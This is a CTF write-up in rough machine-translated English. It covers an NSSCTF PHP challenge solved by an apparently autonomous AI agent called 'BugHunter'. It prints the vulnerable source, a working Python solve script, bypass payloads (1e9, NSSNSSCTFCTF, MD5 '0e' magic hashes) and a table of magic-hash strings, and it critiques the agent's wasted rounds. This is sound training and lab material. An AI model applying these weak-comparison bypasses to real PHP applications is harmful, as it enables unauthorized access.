# 🦞 War Story #002 — NSSCTF PHP Weak comparison + preg_replace Double Write + MD5 Weak comparison

## Metadata

| Field | Value |
|------|------|
| **Date** | 2026-04-19 |
| **Objective** | `http://node5.anna.nssctf.cn:29058/` |
| **Question type** | Web — PHP Weak comparison / preg_replace Double write bypass / MD5 Weak Comparison Collision |
| **Keywords** | PHP、Weak comparison、Array bypass、Double write bypass、MD5 0e Collision、Scientific notation |
| **BugHunter Rounds** | 61(Effective problem-solving approximately 52 Round, including 9 Round repeated validation) |
| **MCP Tool** | fetch, python_execute |
| **Correct Flag** | `NSSCTF{4dd0e8c8-d64c-4fe9-90a7-6944df79a1f2}` |

---

## Attack chain (complete real process)

| Steps | Operation | Discovery/Issue |
|------|------|-----------|
| 1 | First start self-penetration | **Incorrect tool call parameters** — Round 2 Because function arguments JSON Formatting error leads to 400 |
| 2 | Restart | fetch Obtained. `highlight_file` Source code, but HTML Colored labels lead to reading difficulties |
| 3 | Preliminary source code analysis | Identify the three checkpoint structures:L1(numWeak comparison) / L2(str preg_replace) / L3(md5Weak comparison) |
| 4 | Try L1: `num=1e9` | ✅ Correct! Scientific notation bypass strlen≤3 + Numeric Value>999999999 |
| 5 | Try L2: `str=NSSNSSCTFCTF` | ✅ Double-write bypass! The previous one P0 Fix Applied, Immediately Using the Double Write Bypass Knowledge |
| 6 | Analysis L3 Conditions | `md5(md5_1)==md5(md5_2)` — Needed MD5 Weak Comparison Collision |
| 7-9 | **Search repeatedly MD5 Collision value** | Confused search direction: first look for"DualMD5Collision"→ Find again"0eStart Collision"→ Bruteforce search → Multiple timeouts |
| 10 | Use python_execute Bruteforce search 0e Starting with md5 | Find `100523`/`100662` Etc., but md5 Value contains non-numeric characters (such as `0e993d...`) |
| 11 | Send L3: `md5_1=100523&md5_2=100662` | ❌ Return `G100523\n100662` — **md5 Comparison failed!** |
| 12 | False positive cause analysis | md5 Value is like `0e993dffb...` Contains letters `d`/`f`,PHP Will not be treated as scientific notation |
| 13-20 | **Continuously searching for the correct collision value** | Try web Search、Python Brute force、Known Collision Pairs — Multiple timeouts/No results |
| 21-24 | Try PHP Array bypass L3 | `md5_1[]=1&md5_2[]=2` — `md5([])` Return NULL → `Nice!X(` — is_string Check failed |
| 25-33 | **Continue searching for available string collisions.** | Search range expanded, but pure still not found `0e[0-9]+` Format of md5 Collision |
| 34 | Use python_execute Construct Complete Requests | `Nice!yoxi!` Occur simultaneously — Confirm md5 Collision value is valid, but session Management issues |
| 35-40 | **session Manage chaos period** | Attempt to use requests.Session / Step-by-step requests / Same request — Repeated validation flag |
| 41 | Found the correct collision value | `QNKCDZO` (md5=0e830400...) and `s878926199a` (md5=0e545993...) — **Pure 0e+Digital Format** |
| 42-48 | Construct a complete request and validate | Use Python session Proper management cookie, successfully acquired flag |
| 49-61 | **Re-verification period** | Confirm request resend multiple times flag — 9 Round Redundancy Verification |

---

## Source code analysis

### Complete source code

```php
<?php
session_start();
highlight_file(__FILE__);
if(isset($_GET['num'])){
    if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){
        echo ":D";
        $_SESSION['L1'] = 1;
    }else{ echo ":C"; }
}
if(isset($_GET['str'])){
    $str = preg_replace('/NSSCTF/',"",$_GET['str']);
    if($str === "NSSCTF"){
        echo "wow";
        $_SESSION['L2'] = 1;
    }else{ echo $str; }
}
if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
    if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
        echo "Nice!";
        if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
            if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
                echo "yoxi!";
                $_SESSION['L3'] = 1;
            }else{ echo "X("; }
        }
    }else{ echo "G"; }
}
if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
    include('flag.php');
    echo $flag;
}
?>
```

### Three-tier analysis

| Levels. | Parameters | Conditions | Circumvention methods | Successful tagging |
|------|------|------|----------|----------|
| L1 | `num` (GET) | `strlen(num)<=3 && num>999999999` | Scientific notation `1e9` | `:D` |
| L2 | `str` (GET) | `preg_replace('/NSSCTF/','',str)==="NSSCTF"` | Double Write `NSSNSSCTFCTF` | `wow` |
| L3 | `md5_1/md5_2` (POST) | `md5_1!==md5_2 && md5(md5_1)==md5(md5_2) && is_string` | 0e Start MD5 Collision | `Nice!yoxi!` |
| Flag | — | `L1 && L2 && L3` All session In place | — | `NSSCTF{...}` |

---

## Correct Payload And principles

### Complete request

```python
import requests
s = requests.Session()

# Step 1: Settings L1 + L2 session
r1 = s.get("http://target/?num=1e9&str=NSSNSSCTFCTF")
# r1.text Contain ":Dwow"

# Step 2: Trigger L3 + Obtain flag
r2 = s.post("http://target/", data={"md5_1": "QNKCDZO", "md5_2": "s878926199a"})
# r2.text Contain "Nice!yoxi!" + flag
```

### L1: Scientific notation bypass

```
GET ?num=1e9
```

- `strlen("1e9")` = 3(String length)≤ 3 ✅
- `"1e9" > 999999999` → PHP Will. `"1e9"` Convert to `1000000000` > `999999999` ✅

### L2: preg_replace Double write bypass

```
GET ?str=NSSNSSCTFCTF
```

- `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → Remove the middle. `NSSCTF` → `NSS` + `CTF` = `NSSCTF`
- `'NSSCTF' === 'NSSCTF'` ✅

### L3: MD5 Weak Comparison Collision

```
POST md5_1=QNKCDZO&md5_2=s878926199a
```

- `md5("QNKCDZO")` = `0e830400451993494058024219903391`
- `md5("s878926199a")` = `0e545993274517709034328855841020`
- PHP Weak comparison `"0e830400..." == "0e545993..."` → All treated as scientific notation `0` → `0 == 0` = `true` ✅
- `"QNKCDZO" !== "s878926199a"` ✅
- `is_string("QNKCDZO") && is_string("s878926199a")` ✅

### ⚠️ L3 Key traps of:0e Must be all numbers after

- ❌ `100523` → md5 = `0e993dffb88165eb32369e16dd25b536` → Contains letters `d`/`f` → PHP Improper scientific notation → **Weak comparison failure**
- ✅ `QNKCDZO` → md5 = `0e830400451993494058024219903391` → `0e` All are numbers after → PHP Treated as scientific notation 0 → **Weak comparison successful**

---

## BugHunter Process issue analysis

### Efficiency issues:61 Only in the round ~15 Effective wheel

| Issue type | Waste rounds | Root cause |
|----------|----------|------|
| Tool Call Parameter Format Error | 1 | MCP Tool call parameters JSON Format issues |
| MD5 Collision value search direction incorrect | ~12 | Search first"DualMD5"→ Re-search"Brute force collision"→ Timeout retries |
| 0e Collision format understanding deviation | ~5 | Don't know `0e` Must all be numbers after, used letters md5 Value |
| Session Mismanagement | ~8 | Do not understand the need to maintain step-by-step requests cookie, repeatedly request trial and error |
| Repeat validation. | ~9 | Obtain flag Then sent 9 Repeat request confirmation |
| **Effective rounds** | **~15** | If the knowledge is complete、session Correct,5-8 The wheel can solve it |

### Specific problem list

#### 1. MD5 Weak comparative knowledge is inaccurate (the biggest source of waste)

BugHunter Know."0e Starting with md5 Weak comparison equality", but do not know **`0e` Must all be digits after (0-9)** Can only be PHP Treated as scientific notation.

- Used `100523`(md5 = `0e993d...`, contains letters d/f)→ PHP Improper scientific notation → Weak comparison failure
- Waste 5+ Loop on incorrect collision values

**Should be improved**:php-bypass-cheatsheet.md and WAF_BYPASS_KNOWLEDGE Clearly Stated In `0e` Must be all numbers after

#### 2. Inefficient Collision Value Search Strategy

Search path confusion:
1. Search first "Dual MD5 Collision"(Understanding conditions as `md5(md5(x))==md5(md5(y))`)→ Misunderstanding of conditions
2. Brute force search for random numbers → Found md5 Value contains letters
3. web Search → Timeout

**Correct path**: The condition of the question is `md5(x) == md5(y)`(Weak comparison), not double MD5. Should directly use known classic collision strings `QNKCDZO`/`240610708`/`s878926199a` Etc.

**Should be improved**:ctf-web SKILL.md Add in"MD5 Weak comparison standard collision string table"(Including validated values)

#### 3. Session Weak management awareness

- Used in the problem `$_SESSION` Store L1/L2/L3 Status → Must be kept cookie
- BugHunter Try sending all parameters in a single request → Sometimes successful, sometimes failing
- A large number of rounds wasted on "Why flag Not appeared" On debugging

**Should be improved**: Code audit encounters `$_SESSION` Automatically remind when session Management (cookie Persistence)

#### 4. Over-Verification Repetition

Obtain flag Then sent 9 Loop repeat request. While validation is a good habit, validation 1-2 Only once.

**Should be improved**:flag Verify up to one more time after successful verification 1 Then immediately [DONE]

---

## With #001 Comparison:P0 Repair Effect

| Fix | #001 Performance | #002 Performance | Effect |
|--------|-----------|-----------|------|
| **P0-1: Double write bypass** | Completely unaware | **Put to use immediately** `NSSNSSCTFCTF` | ✅ Fix Effective |
| **P0-2: Output semantics** | False positive else Echo as success | Correct identification `:D`/`wow`/`Nice!yoxi!` Marked for success | ✅ Fix Effective |
| New exposure issues | — | MD5 0e Format understanding is not precise | ❌ Needs to be Fixed |
| New exposure issues | — | Session Management Knowledge Gap | ❌ Needs to be Fixed |

---

## Experience summary

### Core methodology

1. **Scientific notation is PHP Universal key for weak comparison bypass.** — `1e9`/`9e9` Formats such as satisfy both short strings and large values
2. **preg_replace Double write bypass** — `First half of the keyword + Keywords + Second half of the keywords`, replace afterwards to spell out the original word
3. **MD5 Weak comparison** — `0e` Starts with and is followed by pure numbers md5 Value,PHP Treated as scientific notation 0And compare equally with each other
4. **⚠️ 0e Must be all numbers after** — `0e830400...`(fully digital ✅) vs `0e993d...`(including letters ❌)
5. **Session The questions must be managed cookie** — PHP `$_SESSION` Dependency cookie, requiring step-by-step requests

### Known MD5 Weak comparison collision string table (verified usable)

| String | MD5 Value | 0ePurely numeric afterwards? |
|--------|--------|------------|
| `QNKCDZO` | `0e830400451993494058024219903391` | ✅ |
| `240610708` | `0e462097431906509019562988736854` | ✅ |
| `s878926199a` | `0e545993274517709034328855841020` | ✅ |
| `s155964671a` | `0e342768416822451524974117254469` | ✅ |
| `s214587387a` | `0e848204310308006290363795692068` | ✅ |
| `s1091221200a` | `0e940625744785414655937625828514` | ✅ |

### BugHunter Capability verification

| Capability | Performance | Scoring |
|------|------|------|
| Target reconnaissance | Quickly obtain source code and identify three key structures | ⭐⭐⭐⭐ |
| L1 Weak comparison bypass | Scientific notation `1e9`,1 Wheel pass | ⭐⭐⭐⭐⭐ |
| L2 Double write bypass | P0 Use it immediately after fixing | ⭐⭐⭐⭐⭐ |
| L3 MD5 Collision | Confusion in Search Directions,0e Format understanding is not precise | ⭐⭐ |
| Session Management | Multiple rounds of waste, not realizing cookie Persistence | ⭐⭐ |
| Flag verification | Excessive validation,9 Wheel Redundancy | ⭐⭐⭐ |

---

## Issues to be fixed.

| Priority | Issue | Suggested fixes |
|--------|------|----------|
| **P0** | MD5 0e Weak comparison format understanding is inaccurate | php-bypass-cheatsheet.md + WAF_BYPASS_KNOWLEDGE Explicit `0e` Must be pure numbers after |
| **P0** | MD5 Weak comparison standard collision string table missing | ctf-web SKILL.md Add verified collision tables |
| **P1** | Session Management Knowledge Gap | Code audit encounters `$_SESSION` Automatically remind when cookie Management |
| **P2** | Flag Over-Verification | At most after successful verification 1 Confirm first, then immediately [DONE] |

---

*BugHunter Second Battle · 2026-04-19 · 61 Round autonomous penetration (effective ~15 Round)· Double-write bypass fix effective · MD5 Collision search inefficient 🦞*
